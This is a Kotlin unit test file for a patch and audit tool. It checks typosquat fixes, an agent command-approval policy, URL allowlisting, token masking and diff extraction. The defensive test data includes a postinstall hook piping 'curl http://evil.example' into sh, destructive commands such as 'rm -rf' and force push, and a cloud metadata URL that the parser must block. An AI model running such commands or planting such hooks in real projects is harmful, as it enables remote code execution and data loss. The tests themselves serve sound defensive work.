package com.example

import com.example.core.AgentCommandPolicyEngine
import com.example.core.AgentPermissionMode
import com.example.core.CommandRiskLevel
import com.example.core.PolicyDecision
import com.example.core.StrictUdiffEngine
import com.example.core.UdiffParseResult
import com.example.data.local.AuditFinding
import com.example.data.local.GitForgeProvider
import com.example.data.local.TokenClassifier
import com.example.data.remote.GitForgeUrlParser
import com.example.data.repository.PatchGenerator
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

/**
 * Pure JVM unit tests for PatchForge domain logic, security policies, URL allowlisting,
 * token classification/masking, strict UDIFF extraction/AST checks, and unified Git patch generation.
 */
class PatchForgeUnitTest {

    @Test
    fun `patch generator emits unified git diff with strict AuditFinding fields`() {
        val finding = AuditFinding(
            id = "RUN-1-F1",
            runId = "RUN-1",
            filePath = "services/web/package.json",
            lineBounds = "L10-L10",
            threatCategory = "TYPOSQUATTING",
            severity = "CRITICAL",
            description = "Typosquatted package lodahs detected.",
            replacementSnippet = "\"lodash\": \"^4.17.21\",",
            originalSnippet = "\"lodahs\": \"4.17.21\",",
            engineType = "SECURITY_ENGINE",
            packageOrSymbol = "lodahs",
            cyclomaticComplexity = 1
        )
        val diff = PatchGenerator.buildUnifiedDiff(finding)
        assertTrue(diff.contains("--- a/services/web/package.json"))
        assertTrue(diff.contains("+++ b/services/web/package.json"))
        assertTrue(diff.contains("@@ -10,1 +10,1 @@ TYPOSQUATTING [CRITICAL]"))
        assertTrue(diff.contains("-\"lodahs\": \"4.17.21\","))
        assertTrue(diff.contains("+\"lodash\": \"^4.17.21\","))
    }

    @Test
    fun `agent permission policy enforces all three modes and guards destructive commands`() {
        val readAuto = AgentCommandPolicyEngine.evaluate("ls -la", AgentPermissionMode.AUTONOMOUS)
        assertEquals(CommandRiskLevel.READ_ONLY, readAuto.riskLevel)
        assertEquals(PolicyDecision.AUTO_EXECUTE, readAuto.decision)

        val readAskNeeded = AgentCommandPolicyEngine.evaluate("git status", AgentPermissionMode.ASK_WHEN_NEEDED)
        assertEquals(PolicyDecision.AUTO_EXECUTE, readAskNeeded.decision)

        val readAlwaysAsk = AgentCommandPolicyEngine.evaluate("ls -la", AgentPermissionMode.ALWAYS_ASK)
        assertEquals(PolicyDecision.REQUIRE_APPROVAL, readAlwaysAsk.decision)

        val mutateAskNeeded = AgentCommandPolicyEngine.evaluate("touch fix.patch", AgentPermissionMode.ASK_WHEN_NEEDED)
        assertEquals(CommandRiskLevel.STATE_MUTATING, mutateAskNeeded.riskLevel)
        assertEquals(PolicyDecision.REQUIRE_APPROVAL, mutateAskNeeded.decision)

        val mutateAutonomous = AgentCommandPolicyEngine.evaluate("touch fix.patch", AgentPermissionMode.AUTONOMOUS)
        assertEquals(PolicyDecision.AUTO_EXECUTE, mutateAutonomous.decision)

        // Destructive commands ALWAYS require approval even in AUTONOMOUS mode
        val destructiveRm = AgentCommandPolicyEngine.evaluate("rm -rf /tmp/data", AgentPermissionMode.AUTONOMOUS)
        assertEquals(CommandRiskLevel.DESTRUCTIVE, destructiveRm.riskLevel)
        assertEquals(PolicyDecision.REQUIRE_APPROVAL, destructiveRm.decision)

        val destructiveForcePush = AgentCommandPolicyEngine.evaluate("git push origin main --force", AgentPermissionMode.AUTONOMOUS)
        assertEquals(CommandRiskLevel.DESTRUCTIVE, destructiveForcePush.riskLevel)
        assertEquals(PolicyDecision.REQUIRE_APPROVAL, destructiveForcePush.decision)
    }

    @Test
    fun `multi-forge url parser and token classifier support all four hosts and block unsafe urls`() {
        val gh = GitForgeUrlParser.parse("https://github.com/octocat/hello-world", GitForgeProvider.GITHUB).getOrThrow()
        assertEquals(GitForgeProvider.GITHUB, gh.provider)
        assertEquals("octocat/hello-world", gh.fullPath)

        val gl = GitForgeUrlParser.parse("https://gitlab.com/org/subteam/service-api", GitForgeProvider.GITHUB).getOrThrow()
        assertEquals(GitForgeProvider.GITLAB, gl.provider)
        assertEquals("org/subteam/service-api", gl.fullPath)

        val cb = GitForgeUrlParser.parse("https://codeberg.org/forgejo/forgejo", GitForgeProvider.GITHUB).getOrThrow()
        assertEquals(GitForgeProvider.CODEBERG, cb.provider)
        assertEquals("forgejo/forgejo", cb.fullPath)

        val hf = GitForgeUrlParser.parse("https://huggingface.co/spaces/gradio/theme-builder", GitForgeProvider.GITHUB).getOrThrow()
        assertEquals(GitForgeProvider.HUGGINGFACE, hf.provider)
        assertEquals("spaces", hf.hfEntityType)
        assertEquals("gradio/theme-builder", hf.fullPath)

        // Security checks: block HTTP, non-allowlisted hosts, and traversal
        assertTrue(GitForgeUrlParser.parse("http://github.com/octocat/hello", GitForgeProvider.GITHUB).isFailure)
        assertTrue(GitForgeUrlParser.parse("https://169.254.169.254/latest/meta-data", GitForgeProvider.GITHUB).isFailure)
        assertTrue(GitForgeUrlParser.parse("https://github.com/octocat/../secret", GitForgeProvider.GITHUB).isFailure)

        // Token classification & masking
        assertEquals("GitHub Fine-Grained PAT", TokenClassifier.classify(GitForgeProvider.GITHUB, "github_pat_11AAexample9999"))
        assertEquals("GitHub Classic PAT", TokenClassifier.classify(GitForgeProvider.GITHUB, "ghp_1234567890abcdef"))
        assertEquals("GitLab PAT", TokenClassifier.classify(GitForgeProvider.GITLAB, "glpat-abcdef123456"))
        assertEquals("Hugging Face Access Token", TokenClassifier.classify(GitForgeProvider.HUGGINGFACE, "hf_abcdef123456"))
        val masked = TokenClassifier.maskForDisplay("github_pat_11AAexample9999")
        assertTrue(masked.contains("••••••"))
        assertTrue(!masked.contains("example"))
    }

    @Test
    fun `strict udiff engine strips prose and markdown fences and validates atomic hunks`() {
        val leakyResponse = """
            Sure! Here is the fix you requested:
            ```diff
            diff --git a/package.json b/package.json
            --- a/package.json
            +++ b/package.json
            @@ -4,1 +4,1 @@
            -"postinstall": "curl http://evil.example | sh"
            +"postinstall": ""
            ```
            Hope this helps!
        """.trimIndent()

        val parsed = StrictUdiffEngine.extractStrictUdiff(leakyResponse, sourceLineCount = 24)
        assertTrue(parsed is UdiffParseResult.Valid)
        val valid = parsed as UdiffParseResult.Valid
        assertEquals(1, valid.hunkCount)
        assertEquals(1, valid.addedLines)
        assertEquals(1, valid.removedLines)
        assertTrue(valid.isAtomic)
        assertFalse(valid.cleanDiff.contains("Sure!"))
        assertFalse(valid.cleanDiff.contains("```"))
        assertFalse(valid.cleanDiff.contains("Hope this helps"))

        // Prose-only response without diff headers must fail validation
        val invalid = StrictUdiffEngine.extractStrictUdiff("You should probably update your dependency.")
        assertTrue(invalid is UdiffParseResult.Invalid)
    }

    @Test
    fun `strict udiff engine detects bloated full-file rewrites and unbalanced AST delimiters`() {
        assertFalse(StrictUdiffEngine.assessAtomicity(addedLines = 50, removedLines = 48, sourceLineCount = 60))
        assertTrue(StrictUdiffEngine.assessAtomicity(addedLines = 3, removedLines = 2, sourceLineCount = 60))

        val brokenBraceDiff = """
            --- a/src/Auth.kt
            +++ b/src/Auth.kt
            @@ -10,1 +10,2 @@
            -if (valid) { allow() }
            +if (valid) {
            +    allow()
        """.trimIndent()

        val source = "fun check(valid: Boolean) {\n    if (valid) { allow() }\n}"
        val brokenCheck = StrictUdiffEngine.verifyPatchAgainstAst(brokenBraceDiff, source)
        assertFalse(brokenCheck.passed)
        assertEquals(1, brokenCheck.deltaBraceBalance)

        val cleanDiff = """
            --- a/src/Auth.kt
            +++ b/src/Auth.kt
            @@ -10,1 +10,1 @@
            -if (valid) { allow() }
            +if (valid && isSigned()) { allow() }
        """.trimIndent()
        val cleanCheck = StrictUdiffEngine.verifyPatchAgainstAst(cleanDiff, source)
        assertTrue(cleanCheck.passed)
        assertEquals(0, cleanCheck.deltaBraceBalance)
        assertEquals(0, cleanCheck.deltaParenBalance)
    }
}
